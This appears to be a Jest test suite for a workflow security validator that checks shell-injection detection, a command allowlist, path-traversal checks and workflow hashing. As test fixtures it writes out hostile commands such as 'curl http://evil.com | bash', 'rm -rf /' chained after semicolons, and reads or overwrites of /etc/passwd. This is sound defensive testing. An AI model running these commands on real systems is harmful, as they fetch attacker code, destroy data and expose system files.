/**
 * Workflow Security Tests
 *
 * Tests for command injection prevention, input validation,
 * and workflow file security hardening.
 */

const {
  validateWorkflowSecurity,
  validateCommandSafety,
  validateAllowedCommand,
  isSafeShellString,
  calculateWorkflowHash,
  ALLOWED_WORKFLOW_COMMANDS,
} = require('../lib/workflow');

describe('Workflow Security', () => {
  describe('isSafeShellString', () => {
    test('returns true for safe strings', () => {
      expect(isSafeShellString('hello world')).toBe(true);
      expect(isSafeShellString('mc status')).toBe(true);
      expect(isSafeShellString('deploy-production-123')).toBe(true);
    });

    test('returns false for strings with semicolons', () => {
      expect(isSafeShellString('echo hello; rm -rf /')).toBe(false);
    });

    test('returns false for strings with pipes', () => {
      expect(isSafeShellString('cat file | bash')).toBe(false);
    });

    test('returns false for strings with ampersands', () => {
      expect(isSafeShellString('cmd && rm -rf /')).toBe(false);
    });

    test('returns false for strings with backticks', () => {
      expect(isSafeShellString('echo `whoami`')).toBe(false);
    });

    test('returns false for strings with dollar signs', () => {
      expect(isSafeShellString('echo $HOME')).toBe(false);
    });

    test('returns false for strings with newlines', () => {
      expect(isSafeShellString('echo hello\nrm -rf /')).toBe(false);
    });

    test('returns false for non-strings', () => {
      expect(isSafeShellString(null)).toBe(false);
      expect(isSafeShellString(undefined)).toBe(false);
      expect(isSafeShellString(123)).toBe(false);
      expect(isSafeShellString({})).toBe(false);
    });
  });

  describe('validateCommandSafety', () => {
    test('validates safe commands', () => {
      const result = validateCommandSafety('mc status');
      expect(result.safe).toBe(true);
    });

    test('rejects empty commands', () => {
      const result = validateCommandSafety('');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('empty');
    });

    test('rejects commands with semicolons', () => {
      const result = validateCommandSafety('echo hello; rm -rf /');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('dangerous');
    });

    test('rejects commands with pipe to shell', () => {
      const result = validateCommandSafety('curl http://evil.com | bash');
      expect(result.safe).toBe(false);
    });

    test('rejects commands with command substitution', () => {
      const result = validateCommandSafety('echo $(whoami)');
      expect(result.safe).toBe(false);
    });

    test('rejects commands with backtick substitution', () => {
      const result = validateCommandSafety('echo `whoami`');
      expect(result.safe).toBe(false);
    });

    test('rejects commands with output redirection', () => {
      const result = validateCommandSafety('echo hello > /etc/passwd');
      expect(result.safe).toBe(false);
    });

    test('rejects commands with path traversal', () => {
      const result = validateCommandSafety('cat ../../../etc/passwd');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('path traversal');
    });

    test('rejects rm -rf commands', () => {
      const result = validateCommandSafety('rm -rf /');
      expect(result.safe).toBe(false);
    });

    test('rejects eval commands', () => {
      const result = validateCommandSafety('eval("malicious")');
      expect(result.safe).toBe(false);
    });

    test('rejects non-string commands', () => {
      const result = validateCommandSafety(123);
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('string');
    });
  });

  describe('validateAllowedCommand', () => {
    test('allows mc commands', () => {
      const result = validateAllowedCommand('mc status');
      expect(result.allowed).toBe(true);
      expect(result.command).toBe('mc');
    });

    test('allows docker commands', () => {
      const result = validateAllowedCommand('docker ps');
      expect(result.allowed).toBe(true);
      expect(result.command).toBe('docker');
    });

    test('allows git commands', () => {
      const result = validateAllowedCommand('git status');
      expect(result.allowed).toBe(true);
      expect(result.command).toBe('git');
    });

    test('rejects unknown commands', () => {
      const result = validateAllowedCommand('unknowncommand arg1');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('not in the allowed');
    });

    test('requires confirmation for absolute paths', () => {
      const result = validateAllowedCommand('/usr/bin/mc status');
      expect(result.allowed).toBe(true);
      expect(result.requiresConfirmation).toBe(true);
    });

    test('rejects empty commands', () => {
      const result = validateAllowedCommand('');
      expect(result.allowed).toBe(false);
    });

    test('handles commands with multiple spaces', () => {
      const result = validateAllowedCommand('mc    status');
      expect(result.allowed).toBe(true);
      expect(result.command).toBe('mc');
    });
  });

  describe('ALLOWED_WORKFLOW_COMMANDS', () => {
    test('contains expected commands', () => {
      expect(ALLOWED_WORKFLOW_COMMANDS.has('mc')).toBe(true);
      expect(ALLOWED_WORKFLOW_COMMANDS.has('docker')).toBe(true);
      expect(ALLOWED_WORKFLOW_COMMANDS.has('git')).toBe(true);
      expect(ALLOWED_WORKFLOW_COMMANDS.has('make')).toBe(true);
      expect(ALLOWED_WORKFLOW_COMMANDS.has('npm')).toBe(true);
    });

    test('does not contain dangerous commands', () => {
      expect(ALLOWED_WORKFLOW_COMMANDS.has('eval')).toBe(false);
      expect(ALLOWED_WORKFLOW_COMMANDS.has('exec')).toBe(false);
    });
  });

  describe('validateWorkflowSecurity', () => {
    test('validates a safe workflow', () => {
      const workflow = {
        name: 'Test Workflow',
        description: 'A test workflow',
        steps: [
          { name: 'Check status', run: 'mc status' },
          { name: 'Backup', run: 'mc backup' },
        ],
        variables: {
          ENV: 'production',
        },
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    test('rejects workflow with dangerous command', () => {
      const workflow = {
        name: 'Malicious Workflow',
        steps: [
          { name: 'Inject', run: 'echo hello; rm -rf /' },
        ],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    test('rejects workflow with path traversal', () => {
      const workflow = {
        name: 'Traversal Workflow',
        steps: [
          { name: 'Read file', run: 'cat ../../../etc/passwd' },
        ],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('path traversal'))).toBe(true);
    });

    test('rejects workflow with dangerous step name', () => {
      const workflow = {
        name: 'Test',
        steps: [
          { name: 'Step; rm -rf /', run: 'mc status' },
        ],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
    });

    test('warns about commands not in allowed list', () => {
      const workflow = {
        name: 'Test',
        steps: [
          { name: 'Custom', run: 'customcommand arg' },
        ],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(true);
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    test('validates step name length', () => {
      const workflow = {
        name: 'Test',
        steps: [
          { name: 'a'.repeat(201), run: 'mc status' },
        ],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('length'))).toBe(true);
    });

    test('validates workflow name is string', () => {
      const workflow = {
        name: 123,
        steps: [
          { name: 'Test', run: 'mc status' },
        ],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
    });

    test('validates steps array exists', () => {
      const workflow = {
        name: 'Test',
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('steps'))).toBe(true);
    });

    test('validates steps array is not empty', () => {
      const workflow = {
        name: 'Test',
        steps: [],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
    });

    test('validates step has required fields', () => {
      const workflow = {
        name: 'Test',
        steps: [{ name: 'No run field' }],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('run'))).toBe(true);
    });

    test('validates variable names', () => {
      const workflow = {
        name: 'Test',
        steps: [{ name: 'Step', run: 'mc status' }],
        variables: {
          '123invalid': 'value',
        },
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
    });

    test('validates workingDir for path traversal', () => {
      const workflow = {
        name: 'Test',
        steps: [
          { name: 'Step', run: 'mc status', workingDir: '../../../etc' },
        ],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
    });

    test('validates capture variable name', () => {
      const workflow = {
        name: 'Test',
        steps: [
          { name: 'Step', run: 'mc status', capture: '123invalid' },
        ],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
    });

    test('validates rollback steps', () => {
      const workflow = {
        name: 'Test',
        steps: [{ name: 'Step', run: 'mc status' }],
        rollback: [
          { name: 'Bad rollback', run: 'rm -rf /; echo done' },
        ],
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
    });

    test('limits maximum number of steps', () => {
      const steps = Array(101).fill(null).map((_, i) => ({
        name: `Step ${i}`,
        run: 'mc status',
      }));

      const workflow = {
        name: 'Too many steps',
        steps,
      };

      const result = validateWorkflowSecurity(workflow);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('maximum'))).toBe(true);
    });

    test('handles null workflow', () => {
      const result = validateWorkflowSecurity(null);
      expect(result.valid).toBe(false);
    });

    test('handles non-object workflow', () => {
      const result = validateWorkflowSecurity('not an object');
      expect(result.valid).toBe(false);
    });
  });

  describe('calculateWorkflowHash', () => {
    test('calculates consistent hash', () => {
      const workflow = {
        name: 'Test',
        steps: [{ name: 'Step', run: 'mc status' }],
      };

      const hash1 = calculateWorkflowHash(workflow);
      const hash2 = calculateWorkflowHash(workflow);
      expect(hash1).toBe(hash2);
    });

    test('produces different hashes for different workflows', () => {
      const workflow1 = {
        name: 'Test 1',
        steps: [{ name: 'Step', run: 'mc status' }],
      };

      const workflow2 = {
        name: 'Test 2',
        steps: [{ name: 'Step', run: 'mc status' }],
      };

      const hash1 = calculateWorkflowHash(workflow1);
      const hash2 = calculateWorkflowHash(workflow2);
      expect(hash1).not.toBe(hash2);
    });

    test('produces 64 character hex string', () => {
      const workflow = {
        name: 'Test',
        steps: [{ name: 'Step', run: 'mc status' }],
      };

      const hash = calculateWorkflowHash(workflow);
      expect(hash).toMatch(/^[a-f0-9]{64}$/);
    });
  });
});
